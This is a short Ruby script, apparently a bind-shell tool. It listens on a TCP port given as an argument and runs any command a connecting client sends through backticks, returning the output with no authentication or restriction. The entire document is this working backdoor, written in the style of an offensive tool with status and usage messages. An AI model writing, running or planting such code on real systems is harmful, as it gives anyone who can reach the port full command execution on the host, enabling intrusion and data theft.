require 'socket'

def bind_shell(port)
  server = TCPServer.new(port)
  print "[*] Shell opened on port #{port}"
  while (session = server.accept)
    session.puts "Connected! Type commands..."
    loop do
      session.print "$ "
      cmd = session.gets.chomp
      break if cmd == "exit"
      output = `#{cmd}`
      session.print output
    end
  end
end

if __FILE__ == $0
  if ARGV.empty?
    print "[!] Usage: bind_shell <port>"
    exit
  end
  bind_shell(ARGV[0].to_i)
end